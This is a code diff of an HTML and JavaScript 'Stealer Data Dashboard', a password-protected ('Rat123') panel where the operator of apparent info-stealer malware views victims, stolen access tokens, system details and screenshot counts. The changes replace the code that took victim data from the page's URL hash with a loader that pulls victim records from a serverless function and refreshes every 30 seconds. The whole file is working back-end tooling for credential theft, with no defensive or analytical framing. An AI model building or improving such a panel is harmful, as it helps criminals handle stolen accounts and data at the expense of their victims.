@@ -46,85 +46,11 @@
             animation: fadeIn 0.5s ease;
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        h2 {
-            color: #fff;
+        .loading {
             text-align: center;
-            margin-bottom: 30px;
-            font-size: 28px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            color: #a0a0a0;
-            margin-bottom: 8px;
-            font-size: 14px;
-            letter-spacing: 1px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            color: #fff;
+            color: #00fff2;
+            padding: 20px;
             font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            border-color: #00fff2;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
-            background: rgba(255, 255, 255, 0.15);
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(45deg, #00fff2, #0077ff);
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
-        }
-
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 255, 255, 0.5);
-        }
-
-        .login-btn:active {
-            transform: translateY(0);
         }
 
         .error-message {
@@ -364,6 +290,27 @@
                 opacity: 1;
             }
         }
+
+        .refresh-btn {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00fff2;
+            color: #00fff2;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-left: 15px;
+        }
+
+        .refresh-btn:hover {
+            background: #00fff2;
+            color: #1a1a2e;
+        }
+
+        .header-controls {
+            display: flex;
+            align-items: center;
+        }
     </style>
 </head>
 <body>
@@ -379,9 +326,13 @@
     </div>
 
     <div class="dashboard-container" id="dashboardContainer">
-        <button class="logout-btn" onclick="logout()">Logout</button>
-        
-        <h2>Stealer Data Dashboard</h2>
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+            <h2>Stealer Data Dashboard</h2>
+            <div class="header-controls">
+                <button class="refresh-btn" onclick="refreshData()">⟳ Refresh</button>
+                <button class="logout-btn" onclick="logout()" style="position: static; margin-left: 10px;">Logout</button>
+            </div>
+        </div>
         
         <div class="stats-grid">
             <div class="stat-card">
@@ -418,7 +369,7 @@
                     </thead>
                     <tbody id="victimsBody">
                         <tr>
-                            <td colspan="6" style="text-align: center; color: #a0a0a0;">No data yet</td>
+                            <td colspan="6" style="text-align: center; color: #a0a0a0;">Loading data...</td>
                         </tr>
                     </tbody>
                 </table>
@@ -440,7 +391,7 @@
                     </thead>
                     <tbody id="tokensBody">
                         <tr>
-                            <td colspan="5" style="text-align: center; color: #a0a0a0;">No tokens yet</td>
+                            <td colspan="5" style="text-align: center; color: #a0a0a0;">Loading data...</td>
                         </tr>
                     </tbody>
                 </table>
@@ -463,7 +414,7 @@
                     </thead>
                     <tbody id="systemBody">
                         <tr>
-                            <td colspan="6" style="text-align: center; color: #a0a0a0;">No system data yet</td>
+                            <td colspan="6" style="text-align: center; color: #a0a0a0;">Loading data...</td>
                         </tr>
                     </tbody>
                 </table>
@@ -484,37 +435,7 @@
         const CORRECT_PASSWORD = "Rat123";
         let victimsData = [];
 
-        function loadData() {
-            const saved = localStorage.getItem('victims');
-            if (saved) {
-                try {
-                    victimsData = JSON.parse(saved);
-                    updateDashboard();
-                } catch (e) {}
-            }
-        }
-
-        function saveData() {
-            localStorage.setItem('victims', JSON.stringify(victimsData));
-        }
-
-        async function fetchVictims() {
-            try {
-                const response = await fetch('/.netlify/functions/victims');
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data && data.length > 0) {
-                        victimsData = data;
-                        saveData();
-                        updateDashboard();
-                        showNotification('Loaded data from server');
-                    }
-                }
-            } catch (e) {
-                console.log('Using local data only');
-            }
-        }
-
+        // Check password and login
         function checkPassword() {
             const password = document.getElementById('password').value;
             const errorMsg = document.getElementById('errorMessage');
@@ -528,7 +449,6 @@
                     document.getElementById('loginContainer').style.display = 'none';
                     document.getElementById('dashboardContainer').style.display = 'block';
                     loadData();
-                    fetchVictims();
                 }, 1000);
             } else {
                 errorMsg.style.display = 'block';
@@ -536,12 +456,14 @@
             }
         }
 
+        // Handle enter key
         document.getElementById('password').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 checkPassword();
             }
         });
 
+        // Logout function
         function logout() {
             document.getElementById('dashboardContainer').style.display = 'none';
             document.getElementById('loginContainer').style.display = 'block';
@@ -550,20 +472,52 @@
             document.getElementById('successMessage').style.display = 'none';
         }
 
-        function addVictimData(data) {
-            const newData = {
-                id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
-                timestamp: new Date().toISOString(),
-                ...data
-            };
-            
-            victimsData.unshift(newData);
-            saveData();
-            updateDashboard();
-            showNotification('New victim data received!');
+        // Load data from server
+        async function loadData() {
+            try {
+                const response = await fetch('/.netlify/functions/victims');
+                if (response.ok) {
+                    const data = await response.json();
+                    victimsData = data || [];
+                    // Save to localStorage as backup
+                    localStorage.setItem('victims', JSON.stringify(victimsData));
+                    updateDashboard();
+                    showNotification(`Loaded ${victimsData.length} victims`);
+                } else {
+                    // Fallback to localStorage
+                    const saved = localStorage.getItem('victims');
+                    if (saved) {
+                        victimsData = JSON.parse(saved);
+                        updateDashboard();
+                    }
+                }
+            } catch (error) {
+                console.error('Failed to load data:', error);
+                // Fallback to localStorage
+                const saved = localStorage.getItem('victims');
+                if (saved) {
+                    victimsData = JSON.parse(saved);
+                    updateDashboard();
+                }
+            }
         }
 
+        // Refresh data manually
+        async function refreshData() {
+            showNotification('Refreshing data...');
+            await loadData();
+        }
+
+        // Update dashboard with current data
         function updateDashboard() {
+            updateStats();
+            updateVictimsTable();
+            updateTokensTable();
+            updateSystemTable();
+        }
+
+        // Update statistics
+        function updateStats() {
             document.getElementById('totalVictims').textContent = victimsData.length;
             
             const today = new Date().toDateString();
@@ -575,12 +529,9 @@
             
             const screenshots = victimsData.filter(v => v.screenshots && v.screenshots.length > 0).length;
             document.getElementById('totalScreenshots').textContent = screenshots;
-
-            updateVictimsTable();
-            updateTokensTable();
-            updateSystemTable();
         }
 
+        // Update victims table
         function updateVictimsTable() {
             const tbody = document.getElementById('victimsBody');
             if (victimsData.length === 0) {
@@ -609,6 +560,7 @@
             }).join('');
         }
 
+        // Update tokens table
         function updateTokensTable() {
             const tbody = document.getElementById('tokensBody');
             const victimsWithTokens = victimsData.filter(v => v.access_token);
@@ -631,6 +583,7 @@
             }).join('');
         }
 
+        // Update system table
         function updateSystemTable() {
             const tbody = document.getElementById('systemBody');
             
@@ -654,6 +607,7 @@
             }).join('');
         }
 
+        // View victim data in modal
         function viewVictimData(id) {
             const victim = victimsData.find(v => v.id === id);
             if (victim) {
@@ -662,10 +616,12 @@
             }
         }
 
+        // Close modal
         function closeModal() {
             document.getElementById('dataModal').style.display = 'none';
         }
 
+        // Copy modal data
         function copyModalData() {
             const data = document.getElementById('modalJson').textContent;
             navigator.clipboard.writeText(data).then(() => {
@@ -673,6 +629,7 @@
             });
         }
 
+        // Show notification
         function showNotification(message) {
             const notification = document.createElement('div');
             notification.className = 'notification';
@@ -684,6 +641,7 @@
             }, 3000);
         }
 
+        // Close modal when clicking outside
         window.onclick = function(event) {
             const modal = document.getElementById('dataModal');
             if (event.target === modal) {
@@ -691,23 +649,12 @@
             }
         };
 
-        window.receiveData = function(data) {
-            addVictimData(data);
-            return { success: true };
-        };
-
-        if (window.location.hash) {
-            try {
-                const hashData = window.location.hash.substring(1);
-                if (hashData.startsWith('{')) {
-                    const data = JSON.parse(decodeURIComponent(hashData));
-                    addVictimData(data);
-                    window.location.hash = '';
-                }
-            } catch (e) {}
-        }
-
-        loadData();
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            if (document.getElementById('dashboardContainer').style.display === 'block') {
+                loadData();
+            }
+        }, 30000);
     </script>
 </body>
 </html>
